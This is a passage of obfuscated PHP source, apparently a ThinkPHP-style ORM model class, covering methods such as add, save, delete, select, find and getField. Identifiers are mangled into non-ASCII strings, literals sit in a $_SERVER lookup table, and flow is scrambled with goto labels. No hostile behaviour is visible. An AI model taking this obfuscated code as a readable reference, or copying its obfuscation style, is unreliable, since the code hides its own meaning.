= explode($c¬ìÌÎ•š[95], $B¹Èâ÷Ô¨½); } else { $this->name = $B¹Èâ÷Ô¨½; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($a‰àÔó‡ò÷)) { $this->tablePrefix = $c¬ìÌÎ•š[33]; } elseif ($c¬ìÌÎ•š[33] != $a‰àÔó‡ò÷) { $this->tablePrefix = $a‰àÔó‡ò÷; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($c¬ìÌÎ•š[241]); } $this->db(0, empty($this->connection) ? $FÙêªÏƒ…Œ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $aœÊ”£ôå =& $_SERVER[´¬]; if (empty($this->fields)) { if (think_config($aœÊ”£ôå[242])) { $d„ß×¸Ì¸¬ = $this->dbName ? $this->dbName : think_config($aœÊ”£ôå[243]); $FêÑª¹„å = think_var_cache($aœÊ”£ôå[244] . strtolower(get_path_this($d„ß×¸Ì¸¬) . $aœÊ”£ôå[95] . $this->name)); if ($FêÑª¹„å) { $B©Ş„Œ¿Í = think_config($aœÊ”£ôå[245]); if (empty($B©Ş„Œ¿Í) || $FêÑª¹„å[$aœÊ”£ôå[246]] == $B©Ş„Œ¿Í) { $this->fields = $FêÑª¹„å; return; } } } $this->flush(); } } public function flush() { goto FÈ˜Õ»Š£“; fœ³áŸ£Ğ½: if (!$DŒÚŒîö¡¾) { return !1; } $this->fields = array_keys($DŒÚŒîö¡¾); $this->fields[$D°»óäİ˜¢[247]] = !1; goto B©‰‚Æ÷®š; Aç„¨¢®‡: if (think_config($D°»óäİ˜¢[242])) { $fÄª×Û«’ = $this->dbName ? $this->dbName : think_config($D°»óäİ˜¢[243]); think_var_cache($D°»óäİ˜¢[244] . strtolower(get_path_this($fÄª×Û«’) . $D°»óäİ˜¢[95] . $this->name), $this->fields); } goto eÆ—–¼äù; FÈ˜Õ»Š£“: $D°»óäİ˜¢ =& $_SERVER[´¬]; $this->db->setModel($this->name); $DŒÚŒîö¡¾ = $this->db->getFields($this->getTableName()); goto fœ³áŸ£Ğ½; B©‰‚Æ÷®š: foreach ($DŒÚŒîö¡¾ as $F§­ÉæİŞì => $cÈò÷ˆêê) { $fÂøŠÅ®½Ÿ[$F§­ÉæİŞì] = $cÈò÷ˆêê[$D°»óäİ˜¢[29]]; if ($cÈò÷ˆêê[$D°»óäİ˜¢[36]]) { $this->fields[$D°»óäİ˜¢[248]] = $F§­ÉæİŞì; if ($cÈò÷ˆêê[$D°»óäİ˜¢[39]]) { $this->fields[$D°»óäİ˜¢[247]] = !0; } } } $this->fields[$D°»óäİ˜¢[249]] = $fÂøŠÅ®½Ÿ; if (think_config($D°»óäİ˜¢[245])) { $this->fields[$D°»óäİ˜¢[246]] = think_config($D°»óäİ˜¢[245]); } goto Aç„¨¢®‡; eÆ—–¼äù: } public function switchModel($B¡ô›‘â¿©, $bÑ†ïá—ª” = array()) { $Aâ¢ØºïÏÉ =& $_SERVER[´¬]; $b¦œâ“ó´ = ucwords(strtolower($B¡ô›‘â¿©)) . $Aâ¢ØºïÏÉ[250]; if (!class_exists($b¦œâ“ó´)) { think_exception($b¦œâ“ó´ . think_lang($Aâ¢ØºïÏÉ[251])); } $this->_extModel = new $b¦œâ“ó´($this->name); if (!empty($bÑ†ïá—ª”)) { foreach ($bÑ†ïá—ª” as $e¿åˆÄÆöÌ) { $this->_extModel->setProperty($e¿åˆÄÆöÌ, $this->{$e¿åˆÄÆöÌ}); } } return $this->_extModel; } public function __set($D˜‰†â¼¦, $a‘ÛÜ£Àì¾) { $this->data[$D˜‰†â¼¦] = $a‘ÛÜ£Àì¾; } public function __get($AæŞİ…¨§) { return isset($this->data[$AæŞİ…¨§]) ? $this->data[$AæŞİ…¨§] : null; } public function __isset($EåæÀÒË±ì) { return isset($this->data[$EåæÀÒË±ì]); } public function __unset($D‡Æªš¤Ä·) { unset($this->data[$D‡Æªš¤Ä·]); } public function __call($eÙ²¡Æùì, $e¡ç›î…˜á) { $CöÑå·ª§Ø =& $_SERVER[´¬]; if (in_array(strtolower($eÙ²¡Æùì), $this->methods, !0)) { $this->options[strtolower($eÙ²¡Æùì)] = $e¡ç›î…˜á[0]; return $this; } elseif (in_array(strtolower($eÙ²¡Æùì), array($CöÑå·ª§Ø[252], $CöÑå·ª§Ø[253], $CöÑå·ª§Ø[254], $CöÑå·ª§Ø[255], $CöÑå·ª§Ø[256]), !0)) { $BÜ¹ „‰•‘ = isset($e¡ç›î…˜á[0]) ? $e¡ç›î…˜á[0] : $CöÑå·ª§Ø[182]; $BÜ¹ „‰•‘ = $this->db->parseKey($BÜ¹ „‰•‘); return $this->getField(strtoupper($eÙ²¡Æùì) . $CöÑå·ª§Ø[257] . $BÜ¹ „‰•‘ . $CöÑå·ª§Ø[258] . $eÙ²¡Æùì, $CöÑå·ª§Ø[252]); } elseif (strtolower(substr($eÙ²¡Æùì, 0, 5)) == $CöÑå·ª§Ø[259]) { $BÜ¹ „‰•‘ = think_parse_name(substr($eÙ²¡Æùì, 5)); $C¨İÍÉë‘ó[$BÜ¹ „‰•‘] = $e¡ç›î…˜á[0]; return $this->where($C¨İÍÉë‘ó)->find(); } elseif (strtolower(substr($eÙ²¡Æùì, 0, 10)) == $CöÑå·ª§Ø[260]) { $cÇ‘çÚ´òÈ = think_parse_name(substr($eÙ²¡Æùì, 10)); $C¨İÍÉë‘ó[$cÇ‘çÚ´òÈ] = $e¡ç›î…˜á[0]; return $this->where($C¨İÍÉë‘ó)->getField($e¡ç›î…˜á[1]); } elseif (isset($this->_scope[$eÙ²¡Æùì])) { return $this->scope($eÙ²¡Æùì, $e¡ç›î…˜á[0]); } elseif (method_exists($this, $eÙ²¡Æùì)) { array_unshift($e¡ç›î…˜á, $eÙ²¡Æùì); return call_user_func_array(array($this, $CöÑå·ª§Ø[261]), $e¡ç›î…˜á); } else { return call_user_func_array(array(parent, $eÙ²¡Æùì), $e¡ç›î…˜á); } } protected function call() { goto FĞ·éÒ–Æˆ; FĞ·éÒ–Æˆ: $E‘èôÓƒÒ™ =& $_SERVER[´¬]; $cé”ï‰Œ¥è = func_get_args(); $eºÈğùè‹° = array_shift($cé”ï‰Œ¥è); goto F¶¨â¡­Ö; cÅˆ˜ÈˆÉ: $ağ áÑÍ¨° = call_user_func_array(array($this, $eºÈğùè‹°), $cé”ï‰Œ¥è); if (method_exists($this, $E‘èôÓƒÒ™[265])) { $eŠî‡òÜ¨ = call_user_func_array(array($this, $E‘èôÓƒÒ™[266]), array($F‚ù‡ºçĞ£, $cé”ï‰Œ¥è, $ağ áÑÍ¨°)); if ($eŠî‡òÜ¨) { return $eŠî‡òÜ¨; } } return $ağ áÑÍ¨°; goto bî˜ ŞØº³; Fõ›ô£Ëä£: if (isset($cé”ï‰Œ¥è[$A§à¡ä»Æ]) && $cé”ï‰Œ¥è[$A§à¡ä»Æ] === $eºÈğùè‹°) { think_exception(__CLASS__ . $E‘èôÓƒÒ™[4] . $eºÈğùè‹° . think_lang($E‘èôÓƒÒ™[262])); return; } $cé”ï‰Œ¥è[] = $eºÈğùè‹°; if (method_exists($this, $E‘èôÓƒÒ™[263])) { $eŠî‡òÜ¨ = call_user_func_array(array($this, $E‘èôÓƒÒ™[264]), array($F‚ù‡ºçĞ£, $cé”ï‰Œ¥è)); if (!is_null($eŠî‡òÜ¨) && $eŠî‡òÜ¨ !== !1) { return $eŠî‡òÜ¨; } } goto cÅˆ˜ÈˆÉ; F¶¨â¡­Ö: $F‚ù‡ºçĞ£ = $eºÈğùè‹°; if (is_array($eºÈğùè‹°)) { $F‚ù‡ºçĞ£ = $eºÈğùè‹°[1]; $eºÈğùè‹° = $eºÈğùè‹°[0]; } $A§à¡ä»Æ = count($cé”ï‰Œ¥è) - 1; goto Fõ›ô£Ëä£; bî˜ ŞØº³: } protected function _initialize() { } protected function _facade($c‡ƒˆ×Âª) { $dŸ­ÍÌååŒ =& $_SERVER[´¬]; if (!empty($this->fields)) { foreach ($c‡ƒˆ×Âª as $FƒŸÖÜÎëĞ => $d‰µÚ­ïï) { if (is_array($this->fields) && !in_array($FƒŸÖÜÎëĞ, $this->fields, !0)) { unset($c‡ƒˆ×Âª[$FƒŸÖÜÎëĞ]); } elseif (is_scalar($d‰µÚ­ïï)) { $this->_parseType($c‡ƒˆ×Âª, $FƒŸÖÜÎëĞ); } } } if (!empty($this->options[$dŸ­ÍÌååŒ[267]])) { $c‡ƒˆ×Âª = array_map($this->options[$dŸ­ÍÌååŒ[267]], $c‡ƒˆ×Âª); unset($this->options[$dŸ­ÍÌååŒ[267]]); } $this->_beforeWrite($c‡ƒˆ×Âª); return $c‡ƒˆ×Âª; } protected function _beforeWrite(&$FæÁÛÀÏ³ˆ) { } public function add($F”ñ‰š§ø = '', $Aù¨”É¡ = array(), $f•›“„°© = false) { goto C³ßˆ¾ÚßÍ; C³ßˆ¾ÚßÍ: if (empty($F”ñ‰š§ø)) { if (!empty($this->data)) { $F”ñ‰š§ø = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[´¬][268]); return !1; } } $Aù¨”É¡ = $this->_parseOptions($Aù¨”É¡); $F”ñ‰š§ø = $this->_facade($F”ñ‰š§ø); goto fÍ–ˆ•¡®’; cïˆ»ã•¤š: return $dãÎ•‡Ä¤œ; goto E³”£ÉÀã¿; fÍ–ˆ•¡®’: if (!1 === $this->_beforeInsert($F”ñ‰š§ø, $Aù¨”É¡)) { return !1; } $dãÎ•‡Ä¤œ = $this->db->insert($F”ñ‰š§ø, $Aù¨”É¡, $f•›“„°©); if (!1 !== $dãÎ•‡Ä¤œ) { $dÈ„ù«÷Ãù = $this->getLastInsID(); if ($dÈ„ù«÷Ãù) { $F”ñ‰š§ø[$this->getPk()] = $dÈ„ù«÷Ãù; $this->_after_insert($F”ñ‰š§ø, $Aù¨”É¡); return $dÈ„ù«÷Ãù; } $this->_after_insert($F”ñ‰š§ø, $Aù¨”É¡); } goto cïˆ»ã•¤š; E³”£ÉÀã¿: } protected function _beforeInsert(&$AòÛãÜß›Ï, $D«”™Åôù) { } protected function _after_insert($aÍËáÓŠ¢÷, $d–ÛÏ‘ğâÓ) { } public function addAll($C‡Ôí†÷¤, $Bİß¨¼–œÜ = array(), $bÕ‡ÅŞêŠÆ = false) { goto EŠªöÛéà—; CÈ˜ƒ¼íàÁ: return $CÔÍÕ¯šó; goto CÅ£™”¯Ë‡; EŠªöÛéà—: $fºôè†¬¯ =& $_SERVER[´¬]; if (empty($C‡Ôí†÷¤)) { $this->error = think_lang($fºôè†¬¯[268]); return !1; } $Bİß¨¼–œÜ = $this->_parseOptions($Bİß¨¼–œÜ); goto c‡õ¸Ï·èò; c‡õ¸Ï·èò: foreach ($C‡Ôí†÷¤ as $c·Ö˜“§ÎŠ => $AÓó¿í×¤Î) { $C‡Ôí†÷¤[$c·Ö˜“§ÎŠ] = $this->_facade($AÓó¿í×¤Î); } if (method_exists($this->db, $fºôè†¬¯[269])) { $CÔÍÕ¯šó = $this->db->insertAll($C‡Ôí†÷¤, $Bİß¨¼–œÜ, $bÕ‡ÅŞêŠÆ); } else { $this->startTrans(); foreach ($C‡Ôí†÷¤ as $c·Ö˜“§ÎŠ => $AÓó¿í×¤Î) { $CÔÍÕ¯šó = $this->db->insert($AÓó¿í×¤Î, $Bİß¨¼–œÜ, $bÕ‡ÅŞêŠÆ); } $this->commit(); } if (!1 !== $CÔÍÕ¯šó) { $AÜóƒÉ…ô¢ = $this->getLastInsID(); if ($AÜóƒÉ…ô¢) { return $AÜóƒÉ…ô¢; } } goto CÈ˜ƒ¼íàÁ; CÅ£™”¯Ë‡: } public function selectAdd($F¦â½Œ²…à = '', $C’ÅÀëóƒÁ = '', $d²ÎíÑÈ‚Š = array()) { $f”ãÛ´ÆÜ† =& $_SERVER[´¬]; $d²ÎíÑÈ‚Š = $this->_parseOptions($d²ÎíÑÈ‚Š); if (!1 === ($A—µôÚ°­ = $this->db->selectInsert($F¦â½Œ²…à ? $F¦â½Œ²…à : $d²ÎíÑÈ‚Š[$f”ãÛ´ÆÜ†[270]], $C’ÅÀëóƒÁ ? $C’ÅÀëóƒÁ : $this->getTableName(), $d²ÎíÑÈ‚Š))) { $this->error = think_lang($f”ãÛ´ÆÜ†[271]); return !1; } else { return $A—µôÚ°­; } } public function save($fŠ‡à†Õ•— = '', $F««öÊ£ã× = array()) { goto f®¶ĞŸ‹¬ğ; a—ãºØ›¿è: $F««öÊ£ã× = $this->_parseOptions($F««öÊ£ã×); $cÚÒ‰àÁç‚ = $this->getPk(); if (!isset($F««öÊ£ã×[$eŞË„ï´‘Ê[272]])) { if (isset($fŠ‡à†Õ•—[$cÚÒ‰àÁç‚])) { $féé§»¸Íğ[$cÚÒ‰àÁç‚] = $fŠ‡à†Õ•—[$cÚÒ‰àÁç‚]; $F««öÊ£ã×[$eŞË„ï´‘Ê[272]] = $féé§»¸Íğ; unset($fŠ‡à†Õ•—[$cÚÒ‰àÁç‚]); } else { $this->error = think_lang($eŞË„ï´‘Ê[271]); return !1; } } goto DãèÅ˜ÂÈŠ; aã£òÈ˜ªë: if (!1 !== $eŸ®Åôö®) { if (isset($D¨¨Û“‰²¯)) { $fŠ‡à†Õ•—[$cÚÒ‰àÁç‚] = $D¨¨Û“‰²¯; } $this->_afterUpdate($fŠ‡à†Õ•—, $F««öÊ£ã×); } return $eŸ®Åôö®; goto B±òÂ¯ãòõ; DãèÅ˜ÂÈŠ: if (is_array($F««öÊ£ã×[$eŞË„ï´‘Ê[272]]) && isset($F««öÊ£ã×[$eŞË„ï´‘Ê[272]][$cÚÒ‰àÁç‚])) { $D¨¨Û“‰²¯ = $F««öÊ£ã×[$eŞË„ï´‘Ê[272]][$cÚÒ‰àÁç‚]; } if (!1 === $this->_beforeUpdate($fŠ‡à†Õ•—, $F««öÊ£ã×)) { return !1; } $eŸ®Åôö® = $this->db->update($fŠ‡à†Õ•—, $F««öÊ£ã×); goto aã£òÈ˜ªë; f®¶ĞŸ‹¬ğ: $eŞË„ï´‘Ê =& $_SERVER[´¬]; if (empty($fŠ‡à†Õ•—)) { if (!empty($this->data)) { $fŠ‡à†Õ•— = $this->data; $this->data = array(); } else { $this->error = think_lang($eŞË„ï´‘Ê[268]); return !1; } } $fŠ‡à†Õ•— = $this->_facade($fŠ‡à†Õ•—); goto a—ãºØ›¿è; B±òÂ¯ãòõ: } protected function _beforeUpdate(&$A„§Öùù»°, $DÂèå­¢à­) { } protected function _afterUpdate($a¤ó‡¸ò›‚, $bºÈ¬Ê´¿) { } public function delete($AÂ›‹ŸğÕä = array()) { goto c¢™ßÄÅì; c¢™ßÄÅì: $d¯‘¿ÃÌÂ‘ =& $_SERVER[´¬]; if (empty($AÂ›‹ŸğÕä) && empty($this->options[$d¯‘¿ÃÌÂ‘[272]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $E‡£ê”ïƒ‰ = $this->getPk(); goto BåÊì×³¿; BåÊì×³¿: if (is_numeric($AÂ›‹ŸğÕä) || is_string($AÂ›‹ŸğÕä)) { if (strpos($AÂ›‹ŸğÕä, $d¯‘¿ÃÌÂ‘[47])) { $bˆ†´‹ê¿„[$E‡£ê”ïƒ‰] = array($d¯‘¿ÃÌÂ‘[273], $AÂ›‹ŸğÕä); } else { $bˆ†´‹ê¿„[$E‡£ê”ïƒ‰] = $AÂ›‹ŸğÕä; } $this->options[$d¯‘¿ÃÌÂ‘[272]] = $bˆ†´‹ê¿„; } $AÂ›‹ŸğÕä = $this->_parseOptions(); if (is_array($AÂ›‹ŸğÕä[$d¯‘¿ÃÌÂ‘[272]]) && isset($AÂ›‹ŸğÕä[$d¯‘¿ÃÌÂ‘[272]][$E‡£ê”ïƒ‰])) { $d†´›²±Œã = $AÂ›‹ŸğÕä[$d¯‘¿ÃÌÂ‘[272]][$E‡£ê”ïƒ‰]; } goto DÈÉˆÅšÉÍ; DÈÉˆÅšÉÍ: $Dİ¬Ñóì· = $this->db->delete($AÂ›‹ŸğÕä); if (!1 !== $Dİ¬Ñóì·) { $d¢Ó¥áëÅ = array(); if (isset($d†´›²±Œã)) { $d¢Ó¥áëÅ[$E‡£ê”ïƒ‰] = $d†´›²±Œã; } $this->_after_delete($d¢Ó¥áëÅ, $AÂ›‹ŸğÕä); } return $Dİ¬Ñóì·; goto b°Øğó¢‰; b°Øğó¢‰: } protected function _after_delete($dÇÌòÑ®©, $FÇ”¢´ô›™) { } public function select($Eñ™ÙÛ§·® = array()) { goto B¹ƒ’®ïõÅ; a–Î·—½’„: $E¾Öë›ÛšÚ = $this->db->select($Eñ™ÙÛ§·®); if (!1 === $E¾Öë›ÛšÚ) { return !1; } if (empty($E¾Öë›ÛšÚ)) { return null; } goto AÈ£¥©ÀÁ„; B¹ƒ’®ïõÅ: $DÛ×®ÚùÖî =& $_SERVER[´¬]; if (is_string($Eñ™ÙÛ§·®) || is_numeric($Eñ™ÙÛ§·®)) { $E†îÜ®ò‡ = $this->getPk(); if (strpos($Eñ™ÙÛ§·®, $DÛ×®ÚùÖî[47])) { $cÌèŒÕ¹çÏ[$E†îÜ®ò‡] = array($DÛ×®ÚùÖî[273], $Eñ™ÙÛ§·®); } else { $cÌèŒÕ¹çÏ[$E†îÜ®ò‡] = $Eñ™ÙÛ§·®; } $this->options[$DÛ×®ÚùÖî[272]] = $cÌèŒÕ¹çÏ; } elseif (!1 === $Eñ™ÙÛ§·®) { $Eñ™ÙÛ§·® = $this->_parseOptions(); return $DÛ×®ÚùÖî[274] . $this->db->buildSelectSql($Eñ™ÙÛ§·®) . $DÛ×®ÚùÖî[275]; } $Eñ™ÙÛ§·® = $this->_parseOptions(); goto a–Î·—½’„; AÈ£¥©ÀÁ„: $this->_afterSelect($E¾Öë›ÛšÚ, $Eñ™ÙÛ§·®); return $E¾Öë›ÛšÚ; goto e…ïî•; e…ïî•: } protected function _afterSelect(&$AñøÔ¢š‰í, $BâˆâŞóË) { } public function buildSql($AÒ·¼ Ÿ…À = array()) { $Bí±„¢çéÓ =& $_SERVER[´¬]; $AÒ·¼ Ÿ…À = $this->_parseOptions($AÒ·¼ Ÿ…À); return $Bí±„¢çéÓ[274] . $this->db->buildSelectSql($AÒ·¼ Ÿ…À) . $Bí±„¢çéÓ[275]; } public function optionsValue($B¾‡³†ÔïË = null) { if (is_null($B¾‡³†ÔïË)) { return $this->options; } elseif (is_array($B¾‡³†ÔïË)) { $this->options = array_merge($this->options, $B¾‡³†ÔïË); } } protected function _parseOptions($C§‰Ú„ŒİŞ = array()) { goto C•Ì¾±Öá‹; CÖø—à¼¼¡: if (isset($C§‰Ú„ŒİŞ[$Dô½ÖÊ‹éĞ[272]]) && is_array($C§‰Ú„ŒİŞ[$Dô½ÖÊ‹éĞ[272]]) && !empty($cí«•Ñ¥) && !isset($C§‰Ú„ŒİŞ[$Dô½ÖÊ‹éĞ[279]]) && !isset($C§‰Ú„ŒİŞ[$Dô½ÖÊ‹éĞ[276]])) { foreach ($C§‰Ú„ŒİŞ[$Dô½ÖÊ‹éĞ[272]] as $cÅ„½µÑ‚ => $E¿¹ô…ë„) { $cÅ„½µÑ‚ = trim($cÅ„½µÑ‚); if (in_array($cÅ„½µÑ‚, $cí«•Ñ¥, !0)) { if (is_scalar($E¿¹ô…ë„)) { $this->_parseType($C§‰Ú„ŒİŞ[$Dô½ÖÊ‹éĞ[272]], $cÅ„½µÑ‚); } } elseif (!is_numeric($cÅ„½µÑ‚) && $Dô½ÖÊ‹éĞ[71] != substr($cÅ„½µÑ‚, 0, 1) && !1 === strpos($cÅ„½µÑ‚, $Dô½ÖÊ‹éĞ[95]) && !1 === strpos($cÅ„½µÑ‚, $Dô½ÖÊ‹éĞ[257]) && !1 === strpos($cÅ„½µÑ‚, $Dô½ÖÊ‹éĞ[280]) && !1 === strpos($cÅ„½µÑ‚, $Dô½ÖÊ‹éĞ[281])) { unset($C§‰Ú„ŒİŞ[$Dô½ÖÊ‹éĞ[272]][$cÅ„½µÑ‚]); } } } $this->_options_filter($C§‰Ú„ŒİŞ); return $C§‰Ú„ŒİŞ; goto AÜÚ±âÕŸÎ; C•Ì¾±Öá‹: $Dô½ÖÊ‹éĞ =& $_SERVER[´¬]; if (is_array($C§‰Ú„ŒİŞ)) { $C§‰Ú„ŒİŞ = array_merge($this->options, $C§‰Ú„ŒİŞ); } $this->options = array(); goto b’Ğ²¢Ûƒá; b’Ğ²¢Ûƒá: if (!isset($C§‰Ú„ŒİŞ[$Dô½ÖÊ‹éĞ[276]])) { $C§‰Ú„ŒİŞ[$Dô½ÖÊ‹éĞ[276]] = $this->getTableName(); $cí«•Ñ¥ = $this->fields; } else { $cí«•Ñ¥ = $this->getDbFields(); } if (!empty($C§‰Ú„ŒİŞ[$Dô½ÖÊ‹éĞ[277]])) { $C§‰Ú„ŒİŞ[$Dô½ÖÊ‹éĞ[276]] .= $Dô½ÖÊ‹éĞ[50] . $C§‰Ú„ŒİŞ[$Dô½ÖÊ‹éĞ[277]]; } $C§‰Ú„ŒİŞ[$Dô½ÖÊ‹éĞ[278]] = $this->name; goto CÖø—à¼¼¡; AÜÚ±âÕŸÎ: } protected function _options_filter(&$eÀî˜¼´ö¬) { } protected function _parseType(&$C©ÌØîŒƒ¼, $A†¯âæèÏª) { $d‰ëáÚÂ‹Œ =& $_SERVER[´¬]; if (empty($this->options[$d‰ëáÚÂ‹Œ[282]][$d‰ëáÚÂ‹Œ[4] . $A†¯âæèÏª])) { $aÑËÜÛ = strtolower($this->fields[$d‰ëáÚÂ‹Œ[249]][$A†¯âæèÏª]); if (!1 !== strpos($aÑËÜÛ, $d‰ëáÚÂ‹Œ[283])) { } elseif (!1 === strpos($aÑËÜÛ, $d‰ëáÚÂ‹Œ[284]) && !1 !== strpos($aÑËÜÛ, $d‰ëáÚÂ‹Œ[285])) { $C©ÌØîŒƒ¼[$A†¯âæèÏª] = intval($C©ÌØîŒƒ¼[$A†¯âæèÏª]); } elseif (!1 !== strpos($aÑËÜÛ, $d‰ëáÚÂ‹Œ[286]) || !1 !== strpos($aÑËÜÛ, $d‰ëáÚÂ‹Œ[287])) { $C©ÌØîŒƒ¼[$A†¯âæèÏª] = floatval($C©ÌØîŒƒ¼[$A†¯âæèÏª]); } elseif (!1 !== strpos($aÑËÜÛ, $d‰ëáÚÂ‹Œ[288])) { $C©ÌØîŒƒ¼[$A†¯âæèÏª] = (bool) $C©ÌØîŒƒ¼[$A†¯âæèÏª]; } } } public function find($CˆÎÁ…ÆèØ = array()) { goto BãÎà¬É÷œ; BãÎà¬É÷œ: $aœœ„£‘ Ù =& $_SERVER[´¬]; if (is_numeric($CˆÎÁ…ÆèØ) || is_string($CˆÎÁ…ÆèØ)) { $dÀëÍÇîó[$this->getPk()] = intval($CˆÎÁ…ÆèØ); $this->options[$aœœ„£‘ Ù[272]] = $dÀëÍÇîó; } $this->options[$aœœ„£‘ Ù[289]] = 1; goto a¢­´™â´Ş; DÔñÃæ‰Ü“: if (!empty($this->options[$aœœ„£‘ Ù[290]])) { return $this->returnResult($this->data, $this->options[$aœœ„£‘ Ù[290]]); } return $this->data; goto Fš’Ê¡éÎì; a§‰Şç»: if (empty($aç¢÷—ë¶‰)) { return null; } $this->data = $aç¢÷—ë¶‰[0]; $this->_afterFind($this->data, $CˆÎÁ…ÆèØ); goto DÔñÃæ‰Ü“; a¢­´™â´Ş: $CˆÎÁ…ÆèØ = $this->_parseOptions(); $aç¢÷—ë¶‰ = $this->db->select($CˆÎÁ…ÆèØ); if (!1 === $aç¢÷—ë¶‰) { return !1; } goto a§‰Şç»; Fš’Ê¡éÎì: } protected function _afterFind(&$B™ï‚¥Ï»Æ, $E£è¯©Ñœ) { } protected function returnResult($f¯½ï¥âæ, $eİ„óãÌÀ = '') { $c…´ãÏ¯…Ä =& $_SERVER[´¬]; if ($eİ„óãÌÀ) { if (is_callable($eİ„óãÌÀ)) { return call_user_func($eİ„óãÌÀ, $f¯½ï¥âæ); } switch (strtolower($eİ„óãÌÀ)) { case $c…´ãÏ¯…Ä[291]: return json_encode($f¯½ï¥âæ); case $c…´ãÏ¯…Ä[292]: return xml_encode($f¯½ï¥âæ); } } return $f¯½ï¥âæ; } public function parseFieldsMap($BŠ²³Ğø›, $aµá¦ÚÍº‰ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $bİ£‚Ò => $D¶Š‚ÚÖ£¿) { if ($aµá¦ÚÍº‰ == 1) { if (isset($BŠ²³Ğø›[$D¶Š‚ÚÖ£¿])) { $BŠ²³Ğø›[$bİ£‚Ò] = $BŠ²³Ğø›[$D¶Š‚ÚÖ£¿]; unset($BŠ²³Ğø›[$D¶Š‚ÚÖ£¿]); } } else { if (isset($BŠ²³Ğø›[$bİ£‚Ò])) { $BŠ²³Ğø›[$D¶Š‚ÚÖ£¿] = $BŠ²³Ğø›[$bİ£‚Ò]; unset($BŠ²³Ğø›[$bİ£‚Ò]); } } } } return $BŠ²³Ğø›; } public function setField($D”Ì‚×¥ÏÕ, $f¨¥šÖåÒÕ = '') { if (is_array($D”Ì‚×¥ÏÕ)) { $A¥Å¯Èšâè = $D”Ì‚×¥ÏÕ; } else { $A¥Å¯Èšâè[$D”Ì‚×¥ÏÕ] = $f¨¥šÖåÒÕ; } return $this->save($A¥Å¯Èšâè); } public function setAdd($EŠËˆæî¥¥, $eëÍø¦ªêÒ = 1) { $AÙ‚³¢¦Äˆ =& $_SERVER[´¬]; $bÙ§øŒ¦Èİ = $EŠËˆæî¥¥ . $AÙ‚³¢¦Äˆ[293] . $eëÍø¦ªêÒ; if ($eëÍø¦ªêÒ < 0) { $bÙ§øŒ¦Èİ = $EŠËˆæî¥¥ . $eëÍø¦ªêÒ; } return $this->setField($EŠËˆæî¥¥, array($AÙ‚³¢¦Äˆ[294], $bÙ§øŒ¦Èİ)); } public function getField($föôñáÊ‘ì, $f–ô¨…š‘Í = null) { $AšŠÇš¯  =& $_SERVER[´¬]; $Aßİ¼Âàğ[$AšŠÇš¯ [270]] = $föôñáÊ‘ì; $Aßİ¼Âàğ = $this->_parseOptions($Aßİ¼Âàğ); $föôñáÊ‘ì = trim($föôñáÊ‘ì); if (strpos($föôñáÊ‘ì, $AšŠÇš¯ [47])) { if (!isset($Aßİ¼Âàğ[$AšŠÇš¯ [289]])) { $Aßİ¼Âàğ[$AšŠÇš¯ [289]] = is_numeric($f–ô¨…š‘Í) ? $f–ô¨…š‘Í : $AšŠÇš¯ [33]; } $b¾â•§íƒÁ = $this->db->select($Aßİ¼Âàğ); if (!empty($b¾â•§íƒÁ)) { goto C…õ¾ÙÈêµ; C…õ¾ÙÈêµ: $c³‚‘ŠÚ¬Ğ = explode($AšŠÇš¯ [47], $föôñáÊ‘ì); $föôñáÊ‘ì = array_keys($b¾â•§íƒÁ[0]); $b‰Ô¼”æ· = array_shift($föôñáÊ‘ì); goto AÀ„²éÚÄ; fÏ§èÇó: foreach ($b¾â•§íƒÁ as $f×øé´‡Î) { $D™äËæè‰‚ = $f×øé´‡Î[$b‰Ô¼”æ·]; if (2 == $d—ÒÓ™É¥ã) { $EçÁËÏ”¹¾[$D™äËæè‰‚] = $f×øé´‡Î[$C«Ã²ÜºÎ¹]; } else { $EçÁËÏ”¹¾[$D™äËæè‰‚] = is_string($f–ô¨…š‘Í) ? implode($f–ô¨…š‘Í, $f×øé´‡Î) : $f×øé´‡Î; } } return $EçÁËÏ”¹¾; goto cŠÛŞæöĞè; AÀ„²éÚÄ: $C«Ã²ÜºÎ¹ = array_shift($föôñáÊ‘ì); $EçÁËÏ”¹¾ = array(); $d—ÒÓ™É¥ã = count($c³‚‘ŠÚ¬Ğ); goto fÏ§èÇó; cŠÛŞæöĞè: } } else { if (!0 !== $f–ô¨…š‘Í) { $Aßİ¼Âàğ[$AšŠÇš¯ [289]] = is_numeric($f–ô¨…š‘Í) ? $f–ô¨…š‘Í : 1; } if ($f–ô¨…š‘Í === $AšŠÇš¯ [252]) { unset($Aßİ¼Âàğ[$AšŠÇš¯ [289]]); } $f×øé´‡Î = $this->db->select($Aßİ¼Âàğ); if (!empty($f×øé´‡Î)) { if ($f–ô¨…š‘Í === $AšŠÇš¯ [252]) { return reset($f×øé´‡Î[0]); } if (!0 !== $f–ô¨…š‘Í && 1 == $Aßİ¼Âàğ[$AšŠÇš¯ [289]]) { return reset($f×øé´‡Î[0]); } foreach ($f×øé´‡Î as $FÙœƒù¡§™) { $cì¶™Äòˆ[] = $FÙœƒù¡§™[$föôñáÊ‘ì]; } return $cì¶™Äòˆ; } } return null; } public function create($bßÙëˆò¥Ñ = '', $AÅöÃƒ–ƒ = '') { goto Aê¬¡â›‰Ş; D·È²ÅÊŒ›: if (isset($EÍæœ«¹×)) { if (is_string($EÍæœ«¹×)) { $EÍæœ«¹× = explode($E¤»áƒØºÂ[47], $EÍæœ«¹×); } if (think_config($E¤»áƒØºÂ[295])) { $EÍæœ«¹×[] = think_config($E¤»áƒØºÂ[296]); } foreach ($bßÙëˆò¥Ñ as $FâŞ¢Ã…ëÂ => $F‡«´‡´) { if (!in_array($FâŞ¢Ã…ëÂ, $EÍæœ«¹×)) { unset($bßÙëˆò¥Ñ[$FâŞ¢Ã…ëÂ]); } } } if (!$this->autoValidation($bßÙëˆò¥Ñ, $AÅöÃƒ–ƒ)) { return !1; } if (!$this->autoCheckToken($bßÙëˆò¥Ñ)) { $this->error = think_lang($E¤»áƒØºÂ[297]); return !1; } goto B¬âô¶İ’¤; Aê¬¡â›‰Ş: $E¤»áƒØºÂ =& $_SERVER[´¬]; if (empty($bßÙëˆò¥Ñ)) { $bßÙëˆò¥Ñ = $_POST; } elseif 